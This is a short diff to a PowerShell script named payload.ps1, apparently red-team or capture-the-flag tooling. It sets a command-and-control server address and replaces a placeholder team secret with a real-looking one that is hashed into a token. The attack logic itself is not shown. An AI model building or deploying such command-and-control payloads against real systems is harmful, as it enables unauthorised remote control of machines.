@@ -1,7 +1,7 @@
 # payload.ps1 - lives in your GitHub repo
 
 $C2      = "https://100.65.4.238"
-$Secret  = "your-ctf-team-secret"
+$Secret  = "foxtrot-redteam-2026"
 $Token   = [System.Security.Cryptography.SHA256]::Create().ComputeHash(
                [System.Text.Encoding]::UTF8.GetBytes($Secret)
            ) | ForEach-Object { $_.ToString("x2") } | Join-String
